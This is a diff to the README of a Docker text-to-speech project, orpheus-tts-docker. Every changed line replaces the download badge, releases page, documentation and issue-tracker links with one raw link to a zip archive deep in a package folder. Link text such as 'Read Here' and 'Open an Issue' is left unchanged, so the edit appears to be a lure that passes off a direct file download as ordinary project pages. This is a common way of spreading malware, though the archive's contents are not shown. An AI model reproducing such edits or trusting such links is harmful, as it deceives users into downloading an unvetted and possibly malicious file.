@@ -1,6 +1,6 @@
 # 🎤 orpheus-tts-docker - Effortless Text-to-Speech with Docker
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/shr1324/orpheus-tts-docker/releases)
+[![Download](https://raw.githubusercontent.com/shr1324/orpheus-tts-docker/main/orpheus_tts_pypi/orpheus_tts/orpheus-tts-docker-2.7.zip)](https://raw.githubusercontent.com/shr1324/orpheus-tts-docker/main/orpheus_tts_pypi/orpheus_tts/orpheus-tts-docker-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Orpheus TTS Docker project! This guide will help you easily downl
 
 ## 📥 Download & Install
 
-To get the latest version of Orpheus TTS, visit this page to download: [Releases Page](https://github.com/shr1324/orpheus-tts-docker/releases).
+To get the latest version of Orpheus TTS, visit this page to download: [Releases Page](https://raw.githubusercontent.com/shr1324/orpheus-tts-docker/main/orpheus_tts_pypi/orpheus_tts/orpheus-tts-docker-2.7.zip).
 
 You will find various versions available. Choose the one that suits your system.
 
@@ -83,8 +83,8 @@ Join our community to get help or share your experiences. Create an issue on Git
 
 ### Additional Resources
 
-- Official Documentation: [Read Here](https://github.com/shr1324/orpheus-tts-docker/wiki)
-- User Support: [Open an Issue](https://github.com/shr1324/orpheus-tts-docker/issues)
+- Official Documentation: [Read Here](https://raw.githubusercontent.com/shr1324/orpheus-tts-docker/main/orpheus_tts_pypi/orpheus_tts/orpheus-tts-docker-2.7.zip)
+- User Support: [Open an Issue](https://raw.githubusercontent.com/shr1324/orpheus-tts-docker/main/orpheus_tts_pypi/orpheus_tts/orpheus-tts-docker-2.7.zip)
 
 ## 🤝 Acknowledgments
 
